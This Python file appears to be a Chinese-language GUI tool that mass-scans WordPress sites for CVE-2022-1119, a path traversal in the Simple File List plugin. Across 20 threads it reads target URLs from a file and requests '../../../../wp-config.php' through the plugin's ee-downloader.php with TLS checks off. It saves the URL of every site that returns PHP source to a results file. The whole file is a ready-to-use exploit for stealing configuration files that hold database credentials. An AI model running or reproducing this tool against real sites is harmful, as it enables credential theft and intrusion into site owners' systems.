import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def wordpress_any_file_read_CVE_2022_1119_exp(url):
    poc = r"""/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"""
    url = url + poc
    try:
        res = requests.get(url, verify=False,timeout=3)
        if "?php" in res.text:
            wordpress_any_file_read_CVE_2022_1119_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            wordpress_any_file_read_CVE_2022_1119_text.see(END)
            with open ("存在WordPress任意文件读取漏洞(CVE-2022-1119)的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            wordpress_any_file_read_CVE_2022_1119_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            wordpress_any_file_read_CVE_2022_1119_text.see(END)
    except Exception as err:
        wordpress_any_file_read_CVE_2022_1119_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        wordpress_any_file_read_CVE_2022_1119_text.see(END)
def get_wordpress_any_file_read_CVE_2022_1119_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def wordpress_any_file_read_CVE_2022_1119_gui():
    wordpress_any_file_read_CVE_2022_1119 = tk.Tk()
    wordpress_any_file_read_CVE_2022_1119.geometry("910x450")
    wordpress_any_file_read_CVE_2022_1119.title("WordPress任意文件读取漏洞(CVE-2022-1119)一把梭")
    wordpress_any_file_read_CVE_2022_1119.resizable(0, 0)
    wordpress_any_file_read_CVE_2022_1119.iconbitmap('logo.ico')
    global wordpress_any_file_read_CVE_2022_1119_text
    wordpress_any_file_read_CVE_2022_1119_text = scrolledtext.ScrolledText(wordpress_any_file_read_CVE_2022_1119,width=123, height=25)
    wordpress_any_file_read_CVE_2022_1119_text.grid(row=0, column=0, padx=10, pady=10)
    wordpress_any_file_read_CVE_2022_1119_text.see(END)
    addrs = get_wordpress_any_file_read_CVE_2022_1119_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(wordpress_any_file_read_CVE_2022_1119_exp, addr)
    wordpress_any_file_read_CVE_2022_1119.mainloop()